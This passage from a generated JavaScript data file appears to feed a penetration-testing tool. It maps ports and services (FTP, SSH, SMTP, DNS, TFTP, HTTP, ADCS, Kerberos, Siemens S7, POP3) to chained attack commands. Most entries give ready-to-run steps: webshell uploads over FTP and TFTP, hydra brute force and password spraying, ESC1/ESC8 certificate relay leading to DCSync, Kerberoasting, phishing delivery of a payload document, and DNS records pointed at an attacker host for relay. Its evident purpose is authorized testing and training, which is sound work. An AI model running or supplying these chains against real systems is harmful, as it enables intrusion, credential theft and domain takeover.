// Comprehensive port/service -> attack-plan corpus: selectors (categories / ATT&CK / keywords
// for the live command-DB query) plus curated, sequenced, chainable steps. Consumed by
// public/scenario.js and mirrored to docs/ by scripts/build-static.js. Generated content —
// regenerate from the service-corpus build rather than hand-editing.
window.CS_PORT_MAP = [
 {
  "ports": [
   21,
   20,
   990
  ],
  "service": "ftp",
  "aliases": [
   "ftp",
   "ftp-data",
   "ftps"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Anonymous read is the headline, but the real win is a writable directory that maps to a webroot or a cron-watched path, so always test PUT even when the listing looks empty and use ls -la / mget .* because dotfiles are hidden by default.",
  "categories": [
   "recon",
   "initial-foothold",
   "file-ops",
   "password-ops",
   "netexec"
  ],
  "attack": [
   "T1071.002",
   "T1078",
   "T1110.001",
   "T1105",
   "T1083"
  ],
  "keywords": [
   "ftp",
   "ftp-anon",
   "nxc ftp",
   "hydra ftp",
   "wget ftp",
   "curl -t ftp",
   "mget"
  ],
  "yields": [
   "file-read",
   "source-code",
   "creds",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "NSE sweep incl. anon + known backdoors",
    "cmd": "nmap -p21 -sCV --script ftp-anon,ftp-syst,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <TARGET_IP> -oN nmap_ftp.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Anonymous login + hidden-file listing",
    "cmd": "ftp anonymous@<TARGET_IP>   # then: binary, passive, ls -la, mget .*",
    "when": "if anonymous allowed",
    "yields": [
     "file-read",
     "source-code"
    ]
   },
   {
    "phase": "enum",
    "label": "Recursive anonymous mirror of the whole tree",
    "cmd": "wget -m --no-passive-ftp ftp://anonymous:anonymous@<TARGET_IP>/ -P ./ftp_loot",
    "when": "if anonymous allowed",
    "yields": [
     "source-code",
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Writable-dir test, then drop a webshell if it maps to a webroot",
    "cmd": "curl -T shell.php ftp://<TARGET_IP>/shell.php --user 'anonymous:anonymous'",
    "when": "if upload succeeds and the FTP root is served over HTTP",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "enum",
    "label": "Authenticated listing via netexec",
    "cmd": "nxc ftp <TARGET_IP> -u <USER> -p '<PASS>' --ls",
    "when": "if creds known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Credential spray (rate-limited, stop on first hit)",
    "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP> -t 4 -f",
    "when": "if usernames known and no lockout policy",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "loot",
    "label": "Grep the mirror for secrets and keys",
    "cmd": "grep -rniE 'passw|api[_-]?key|secret|BEGIN (OPENSSH|RSA) PRIVATE KEY' ./ftp_loot",
    "when": "if files were downloaded",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   22
  ],
  "service": "ssh",
  "aliases": [
   "ssh",
   "openssh"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The win on SSH is almost never online brute force - it is a password or private key you already looted on another host being reused here, or a vulnerable OpenSSH/libssh version (user enumeration, auth bypass).",
  "categories": [
   "password-ops",
   "netexec",
   "initial-foothold",
   "pivoting",
   "post-exploitation-linux"
  ],
  "attack": [
   "T1021.004",
   "T1110.003",
   "T1078",
   "T1552.004"
  ],
  "keywords": [
   "ssh",
   "nxc ssh",
   "hydra ssh",
   "sshpass",
   "ssh2john",
   "ssh-audit",
   "ssh_enumusers"
  ],
  "yields": [
   "foothold",
   "shell",
   "creds"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Version + host-key fingerprint",
    "cmd": "nmap -sCV -p<PORT> <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Audit algorithms and banner for a known-vuln build",
    "cmd": "ssh-audit <TARGET_IP>:<PORT>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Username enumeration (CVE-2018-15473, OpenSSH < 7.7)",
    "cmd": "msfconsole -q -x \"use scanner/ssh/ssh_enumusers; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; run; exit\"",
    "when": "if OpenSSH looks older than 7.7",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "Spray a known password across found users",
    "cmd": "nxc ssh <TARGET_IP> --port <PORT> -u users.txt -p '<PASS>' --continue-on-success",
    "when": "if creds or a likely password are known",
    "yields": [
     "creds",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Targeted brute force (slow, lockout-aware)",
    "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>:<PORT> -t 4",
    "when": "if no creds and no account-lockout risk",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Log in with a looted private key",
    "cmd": "chmod 600 id_rsa && ssh -i id_rsa <USER>@<TARGET_IP> -p <PORT>",
    "when": "if a private key was recovered elsewhere",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "loot",
    "label": "Crack a passphrase-protected private key",
    "cmd": "ssh2john id_rsa > sshkey.hash && john --wordlist=/usr/share/wordlists/rockyou.txt sshkey.hash",
    "when": "if the recovered key asks for a passphrase",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "lateral",
    "label": "Open a SOCKS proxy for deeper access",
    "cmd": "ssh -N -D 1080 <USER>@<TARGET_IP> -p <PORT>",
    "when": "if a shell is held and an internal subnet must be reached",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   23
  ],
  "service": "telnet",
  "aliases": [
   "telnet"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "Telnet is cleartext, so the win is a banner that names the device/firmware for a known exploit, default appliance credentials behind it, or credentials you sniff on the wire.",
  "categories": [
   "recon",
   "password-ops",
   "service-exploitation",
   "initial-foothold"
  ],
  "attack": [
   "T1021",
   "T1110.001",
   "T1078.001",
   "T1040"
  ],
  "keywords": [
   "telnet",
   "hydra telnet",
   "ncrack telnet",
   "telnet-ntlm-info",
   "searchsploit"
  ],
  "yields": [
   "foothold",
   "shell",
   "creds"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Banner grab + NSE device info",
    "cmd": "nmap -sCV -p<PORT> --script telnet-ntlm-info,telnet-encryption <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Read the banner manually for device and firmware",
    "cmd": "telnet <TARGET_IP> <PORT>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Search the banner version for a public exploit",
    "cmd": "searchsploit <product> <version>",
    "when": "if the banner names a device, router or firmware build",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Try default/appliance credential list",
    "cmd": "hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-telnet-betterdefaultpasslist.txt telnet://<TARGET_IP>:<PORT>",
    "when": "if a network appliance or IoT device is behind it",
    "yields": [
     "creds",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Credential brute force",
    "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://<TARGET_IP>:<PORT> -t 4",
    "when": "if no default creds hit",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Interactive login",
    "cmd": "telnet <TARGET_IP> <PORT>",
    "when": "if creds known",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   25,
   465,
   587
  ],
  "service": "smtp",
  "aliases": [
   "smtp",
   "smtps",
   "submission"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "VRFY is usually disabled but RCPT TO still enumerates valid users, and the EHLO reply leaks the internal hostname plus AUTH mechanisms; an NTLM mechanism there hands you the AD domain and host for free before you have a single credential.",
  "categories": [
   "recon",
   "service-exploitation",
   "password-ops",
   "social-eng",
   "initial-foothold"
  ],
  "attack": [
   "T1046",
   "T1087.003",
   "T1589.002",
   "T1110.003",
   "T1566.001"
  ],
  "keywords": [
   "swaks",
   "smtp-user-enum",
   "smtp-open-relay",
   "smtp-ntlm-info",
   "smtp-enum-users",
   "nmap smtp",
   "hydra smtp",
   "vrfy",
   "rcpt to",
   "ehlo"
  ],
  "yields": [
   "users",
   "creds",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "NSE sweep: commands, relay, NTLM info, user enum",
    "cmd": "nmap -p25,465,587 -sCV --script smtp-commands,smtp-open-relay,smtp-ntlm-info,smtp-enum-users <TARGET_IP> -oN nmap_smtp.txt",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "User enumeration via RCPT TO",
    "cmd": "smtp-user-enum -M RCPT -D <DOMAIN> -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Manual EHLO / VRFY / RCPT banter",
    "cmd": "nc -nv <TARGET_IP> 25  # EHLO x  /  VRFY root  /  RCPT TO:<<USER>@<DOMAIN>>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Open-relay proof",
    "cmd": "swaks --to victim@<DOMAIN> --from attacker@evil.tld --server <TARGET_IP> --header 'Subject: relay test' --body 'relay test'",
    "when": "if relay accepts an external-to-external envelope",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Credential brute/spray over SMTP AUTH",
    "cmd": "hydra -L users.txt -P passwords.txt smtp://<TARGET_IP> -t 4 -f",
    "when": "if usernames known and no lockout policy",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Submission port auth with STARTTLS",
    "cmd": "swaks --server <TARGET_IP>:587 --tls --auth-user '<USER>' --auth-password '<PASS>' --to <USER>@<DOMAIN> --from <USER>@<DOMAIN> --body 'auth test'",
    "when": "if creds known",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Authorized phishing delivery with attachment",
    "cmd": "swaks --server <TARGET_IP> --to <USER>@<DOMAIN> --from it@<DOMAIN> --header 'Subject: Password reset' --body @phish_body.txt --attach @payload.doc",
    "when": "if client-side/phishing is in scope",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   53
  ],
  "service": "ad-dns",
  "aliases": [
   "domain",
   "dns"
  ],
  "proto": "both",
  "risk": "medium",
  "note": "On a DC the DNS server is a map of the domain: the _msdcs SRV records name every domain controller and the forest root, and with any authenticated user you can dump the entire ADIDNS zone (adidnsdump) and often add your own records for coercion/relay — far more than the AXFR you came for.",
  "categories": [
   "ad-recon",
   "recon"
  ],
  "attack": [
   "T1590.002",
   "T1018",
   "T1557"
  ],
  "keywords": [
   "dig srv",
   "adidnsdump",
   "dnstool",
   "nsupdate",
   "dig axfr",
   "_msdcs"
  ],
  "yields": [
   "domain-user",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Find the domain controllers and forest root via SRV",
    "cmd": "dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<DC_IP> +short && dig SRV _kerberos._tcp.<DOMAIN> @<DC_IP> +short",
    "when": "if domain name known",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "Attempt a zone transfer",
    "cmd": "dig axfr <DOMAIN> @<DC_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Dump the full ADIDNS zone with any domain user",
    "cmd": "adidnsdump -u '<DOMAIN>\\\\<USER>' -p '<PASS>' <DC_IP> -r",
    "when": "if creds known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "lateral",
    "label": "Add a record for coercion or relay",
    "cmd": "dnstool.py -u '<DOMAIN>\\\\<USER>' -p '<PASS>' -r 'attacker' -a add -d <ATTACKER_IP> <DC_IP>",
    "when": "if creds known and dynamic updates allowed",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   53
  ],
  "service": "dns",
  "aliases": [
   "domain",
   "dns"
  ],
  "proto": "both",
  "risk": "medium",
  "note": "The loud win is an AXFR zone transfer, but the quiet one is pointing the target's own resolver at internal name brute-forcing and reverse sweeps — an internal DNS answering for a .corp/.local zone hands you the AD domain name and DC list before you ever touch 88 or 389.",
  "categories": [
   "recon",
   "ad-recon",
   "pivoting"
  ],
  "attack": [
   "T1590.002",
   "T1046",
   "T1018"
  ],
  "keywords": [
   "dig axfr",
   "dnsrecon",
   "dnsenum",
   "gobuster dns",
   "fierce",
   "dig srv",
   "host -l"
  ],
  "yields": [
   "hostnames",
   "subdomains",
   "domain"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Zone transfer (AXFR)",
    "cmd": "dig axfr <DOMAIN> @<TARGET_IP>",
    "when": "always",
    "yields": [
     "hostnames"
    ]
   },
   {
    "phase": "recon",
    "label": "NSE sweep (recursion, NSID, zone transfer)",
    "cmd": "nmap -p53 -sU -sT -sV --script dns-nsid,dns-recursion,dns-zone-transfer --script-args dns-zone-transfer.domain=<DOMAIN> <TARGET_IP> -oN nmap_dns.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Server version disclosure",
    "cmd": "dig CH TXT version.bind @<TARGET_IP> +short",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "AD service records — names the domain and the DCs",
    "cmd": "dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<TARGET_IP> +short && dig SRV _kerberos._tcp.<DOMAIN> @<TARGET_IP> +short",
    "when": "if Windows/AD suspected",
    "yields": [
     "domain"
    ]
   },
   {
    "phase": "enum",
    "label": "Subdomain brute through the target resolver",
    "cmd": "gobuster dns -d <DOMAIN> -r <TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
    "when": "if domain name known",
    "yields": [
     "hostnames"
    ]
   },
   {
    "phase": "loot",
    "label": "Reverse-lookup sweep of the subnet",
    "cmd": "dnsrecon -r <NETWORK> -n <TARGET_IP>",
    "when": "if internal resolver",
    "yields": [
     "hostnames"
    ]
   }
  ]
 },
 {
  "ports": [
   69
  ],
  "service": "tftp",
  "aliases": [
   "tftp"
  ],
  "proto": "udp",
  "risk": "medium",
  "note": "TFTP has no directory listing so you must guess filenames, which is why network-gear config backups (running-config, startup-config, <host>-confg) live here; also test write, since a writable TFTP root inside a webroot or PXE path is a straight foothold.",
  "categories": [
   "recon",
   "file-ops",
   "initial-foothold"
  ],
  "attack": [
   "T1105",
   "T1602.002",
   "T1046",
   "T1083"
  ],
  "keywords": [
   "tftp",
   "tftp-enum",
   "curl tftp",
   "atftp",
   "running-config"
  ],
  "yields": [
   "file-read",
   "creds",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm service and brute common filenames",
    "cmd": "nmap -sU -p69 -sV --script tftp-enum <TARGET_IP> -oN nmap_tftp.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Scripted pull of likely config/backup names",
    "cmd": "for f in running-config startup-config config.text backup.cfg system.cfg web.conf sysinfo.xml; do curl -s --max-time 5 -o \"$f\" tftp://<TARGET_IP>/$f && [ -s \"$f\" ] && echo \"GOT $f\"; done",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Interactive fetch of a specific config",
    "cmd": "tftp <TARGET_IP>   # then: binary, get running-config, get startup-config",
    "when": "if a filename is known or guessed",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Write test (round-trip a marker file)",
    "cmd": "echo test > t.txt && curl -T t.txt tftp://<TARGET_IP>/t.txt && curl -s tftp://<TARGET_IP>/t.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Upload a payload to a known writable path",
    "cmd": "tftp <TARGET_IP> -c put shell.php",
    "when": "if writable and the TFTP root maps to a webroot or PXE path",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "loot",
    "label": "Extract creds and SNMP strings from pulled configs",
    "cmd": "grep -iE 'passw|secret|snmp-server community|enable ' running-config startup-config *.cfg 2>/dev/null",
    "when": "if a config was retrieved",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   79
  ],
  "service": "finger",
  "aliases": [
   "finger"
  ],
  "proto": "tcp",
  "risk": "low",
  "note": "Finger is a pure username oracle — confirm which accounts exist and who is logged in, then feed that list straight into SSH/SMB spraying instead of guessing names.",
  "categories": [
   "recon",
   "password-ops"
  ],
  "attack": [
   "T1087.001",
   "T1046"
  ],
  "keywords": [
   "finger",
   "finger-user-enum",
   "pentestmonkey"
  ],
  "yields": [
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "NSE finger probe",
    "cmd": "nmap -p79 -sV --script finger <TARGET_IP> -oN nmap_finger.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Query common accounts and the user list",
    "cmd": "finger root@<TARGET_IP>; finger @<TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Bulk username enumeration",
    "cmd": "finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "loot",
    "label": "See who is currently logged in",
    "cmd": "finger 0@<TARGET_IP>; finger .@<TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   }
  ]
 },
 {
  "ports": [
   80,
   443
  ],
  "service": "adcs-web-enrollment",
  "aliases": [
   "http",
   "https",
   "ssl/http"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "The /certsrv web enrollment and the CES/CEP web services are the ESC8 relay target - coerce a DC or server over SMB/RPC, relay that NTLM auth to this HTTP endpoint, request a certificate as the victim machine, and you hold a DC- or DA-capable identity without ever touching a password; always check whether enrollment is HTTP (no EPA) because that is what makes the relay land.",
  "categories": [
   "adcs-attacks",
   "ad-attacks",
   "impacket-suite",
   "service-exploitation",
   "netexec"
  ],
  "attack": [
   "T1649",
   "T1187",
   "T1557.001",
   "T1190"
  ],
  "keywords": [
   "certipy relay",
   "ntlmrelayx",
   "--adcs",
   "certsrv",
   "certfnsh.asp",
   "esc8",
   "certipy find"
  ],
  "yields": [
   "hashes",
   "creds",
   "foothold",
   "domain-user",
   "admin"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Find the web enrollment endpoint and auth type",
    "cmd": "curl -sk -I https://<TARGET_IP>/certsrv/certfnsh.asp && nmap -p80,443 --script http-ntlm-info <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Enumerate the CA and flag ESC1-ESC8 paths",
    "cmd": "certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout",
    "when": "if creds known",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "ESC1: request a cert impersonating admin via a vulnerable template",
    "cmd": "certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'administrator@<DOMAIN>'",
    "when": "if find flags ESC1 (template allows SAN + client auth)",
    "yields": [
     "foothold",
     "admin"
    ]
   },
   {
    "phase": "foothold",
    "label": "ESC8: stand up the ADCS relay (impacket)",
    "cmd": "impacket-ntlmrelayx -t http://<TARGET_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
    "when": "always (run alongside a coercion trigger)",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "foothold",
    "label": "Or relay with modern certipy",
    "cmd": "certipy-ad relay -target 'http://<TARGET_IP>/certsrv/certfnsh.asp' -template DomainController",
    "when": "always (run alongside a coercion trigger)",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "privesc",
    "label": "Authenticate with the captured/requested cert for a TGT + NT hash",
    "cmd": "certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>",
    "when": "after a cert is captured or requested",
    "yields": [
     "hashes",
     "admin"
    ]
   },
   {
    "phase": "loot",
    "label": "DCSync the domain with the recovered hash",
    "cmd": "impacket-secretsdump -just-dc -hashes :<HASH> '<DOMAIN>/Administrator'@<DC_IP>",
    "when": "if a DA/DC hash was recovered",
    "yields": [
     "hashes",
     "admin"
    ]
   }
  ]
 },
 {
  "ports": [
   80,
   8080,
   8000,
   8008,
   8888,
   8081,
   8181
  ],
  "service": "http",
  "aliases": [
   "http",
   "http-alt",
   "http-proxy",
   "www",
   "http-mgmt",
   "sun-answerbook",
   "ddi-tcp-1"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "The web root is almost always the intended way in on OSCP boxes; the win is hiding in dir-brute output, a vhost, an upload field, or a parameter that trusts your input (LFI/SQLi/SSTI).",
  "categories": [
   "recon",
   "web-exploitation",
   "vuln-assessment",
   "sqli",
   "initial-foothold"
  ],
  "attack": [
   "T1595.003",
   "T1190",
   "T1083",
   "T1505.003",
   "T1046"
  ],
  "keywords": [
   "whatweb",
   "feroxbuster",
   "ffuf",
   "gobuster",
   "nuclei",
   "nikto",
   "wpscan",
   "sqlmap",
   "curl",
   "dirsearch",
   "wfuzz"
  ],
  "yields": [
   "source-code",
   "creds",
   "foothold",
   "file-read",
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint the stack",
    "cmd": "whatweb -a 3 http://<TARGET_IP>:<PORT>/ && curl -sI http://<TARGET_IP>:<PORT>/",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "nmap http NSE sweep",
    "cmd": "nmap -sV -p <PORT> --script=http-enum,http-title,http-headers,http-methods,http-robots.txt <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Directory and file brute-force",
    "cmd": "feroxbuster -u http://<TARGET_IP>:<PORT> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -o ferox_<PORT>.txt",
    "when": "always",
    "yields": [
     "source-code",
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Vhost / subdomain discovery",
    "cmd": "ffuf -u http://<TARGET_IP>:<PORT>/ -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac",
    "when": "if a domain name is known (cert, redirect, or http-title)",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "CMS detection and scan",
    "cmd": "wpscan --url http://<TARGET_IP>:<PORT>/ --enumerate ap,at,u --plugins-detection aggressive",
    "when": "if whatweb/nuclei shows WordPress (swap wpscan for droopescan/joomscan on Drupal/Joomla)",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Template-based vuln scan",
    "cmd": "nuclei -u http://<TARGET_IP>:<PORT> -t http/ -severity medium,high,critical && nikto -h http://<TARGET_IP>:<PORT>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Test parameters for SQLi",
    "cmd": "sqlmap -u 'http://<TARGET_IP>:<PORT>/page.php?id=1' --batch --risk=2 --level=3 --dbs",
    "when": "if a GET/POST parameter reflects into a query or errors",
    "yields": [
     "creds",
     "file-read",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "LFI -> php://filter source read / log poison",
    "cmd": "curl -s 'http://<TARGET_IP>:<PORT>/index.php?page=php://filter/convert.base64-encode/resource=config' | base64 -d",
    "when": "if a page/file/lang parameter includes files",
    "yields": [
     "source-code",
     "creds",
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Probe for SSTI (math payload)",
    "cmd": "curl -gs 'http://<TARGET_IP>:<PORT>/?name=${7*7}' ; curl -gs 'http://<TARGET_IP>:<PORT>/?name={{7*7}}'",
    "when": "if a parameter is reflected into a server-side template (a 49 in the response confirms it; then escalate to RCE per engine)",
    "yields": [
     "source-code",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   88
  ],
  "service": "kerberos",
  "aliases": [
   "kerberos-sec",
   "kerberos",
   "krb5"
  ],
  "proto": "both",
  "risk": "critical",
  "note": "Port 88 open means this host is a domain controller, which reframes the whole box; Kerberos pre-auth username enumeration and AS-REP roasting are fully credential-free and do NOT touch the SMB lockout counter, so mine users and hashes here before you spray anything — and sync your clock to the DC first, because every Kerberos tool fails silently past 5 minutes of skew.",
  "categories": [
   "ad-recon",
   "ad-attacks",
   "impacket-suite",
   "netexec",
   "password-ops"
  ],
  "attack": [
   "T1558.003",
   "T1558.004",
   "T1087.002",
   "T1110.003",
   "T1046"
  ],
  "keywords": [
   "kerbrute",
   "getnpusers",
   "getuserspns",
   "gettgt",
   "asreproast",
   "kerberoast",
   "nxc ldap",
   "impacket"
  ],
  "yields": [
   "users",
   "hashes",
   "creds",
   "domain-user"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Sync clock to the DC (do this first)",
    "cmd": "sudo ntpdate -u <DC_IP> || sudo rdate -n <DC_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "NSE user enumeration via Kerberos pre-auth",
    "cmd": "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt <DC_IP> -oN nmap_krb.txt",
    "when": "if domain name known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Credential-free username enumeration (no lockout)",
    "cmd": "kerbrute userenum --dc <DC_IP> -d <DOMAIN> /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o kerbrute_users.txt",
    "when": "if domain name known",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "AS-REP roast accounts without pre-auth",
    "cmd": "impacket-GetNPUsers '<DOMAIN>/' -usersfile users.txt -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt",
    "when": "if usernames known",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "foothold",
    "label": "Password spray recovered users (watch lockout policy)",
    "cmd": "kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt '<PASS>'",
    "when": "if a candidate password is known",
    "yields": [
     "creds",
     "domain-user"
    ]
   },
   {
    "phase": "lateral",
    "label": "Kerberoast every SPN account with any domain creds",
    "cmd": "impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt",
    "when": "if creds known",
    "yields": [
     "hashes"
    ]
   },
   {
    "phase": "loot",
    "label": "Crack TGS/AS-REP hashes offline",
    "cmd": "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt   # AS-REP = -m 18200",
    "when": "if hashes captured",
    "yields": [
     "creds",
     "domain-user"
    ]
   },
   {
    "phase": "loot",
    "label": "Request a TGT for pass-the-ticket once you hold creds",
    "cmd": "impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> && export KRB5CCNAME=<USER>.ccache",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   102
  ],
  "service": "s7comm",
  "aliases": [
   "iso-tsap",
   "s7comm",
   "cotp"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Port 102 is the Siemens S7 PLC (COTP/ISO-TSAP); s7-info hands you the exact module, firmware, serial and plant identification that maps straight to a known-CVE list, and unprotected CPUs accept STOP/START and program-download requests with no credentials.",
  "categories": [
   "recon",
   "service-exploitation",
   "vuln-assessment",
   "metasploit"
  ],
  "attack": [
   "T1046",
   "T0846",
   "T0888",
   "T0843",
   "T0813"
  ],
  "keywords": [
   "s7-info",
   "plcscan",
   "snap7",
   "python-snap7",
   "nmap s7"
  ],
  "yields": [
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Identify the PLC: module, firmware, serial, plant id",
    "cmd": "nmap -p102 --script s7-info <TARGET_IP> -oN nmap_s7.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Fingerprint S7/COTP endpoints",
    "cmd": "plcscan <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Pull CPU state and SZL system info via snap7",
    "cmd": "python3 -c \"import snap7; c=snap7.client.Client(); c.connect('<TARGET_IP>',0,1); print(c.get_cpu_state()); print(c.get_cpu_info())\"",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Map firmware/serial to the matching Siemens advisory",
    "cmd": "searchsploit siemens s7",
    "when": "if firmware version identified",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   110,
   995
  ],
  "service": "pop3",
  "aliases": [
   "pop3",
   "pop3s"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "POP3 is a loot service, not an entry point; the value appears the moment you have one valid credential: mailboxes routinely hold password-reset links, plaintext service passwords and VPN configs, and the AUTH line may leak NTLM/domain info even before login.",
  "categories": [
   "recon",
   "password-ops",
   "service-exploitation",
   "social-eng"
  ],
  "attack": [
   "T1046",
   "T1110.003",
   "T1078",
   "T1114.002"
  ],
  "keywords": [
   "pop3",
   "pop3s",
   "pop3-capabilities",
   "pop3-ntlm-info",
   "hydra pop3",
   "nmap pop3",
   "openssl s_client",
   "curl pop3s",
   "user pass",
   "retr"
  ],
  "yields": [
   "creds",
   "file-read",
   "users"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Capabilities + NTLM/domain leak",
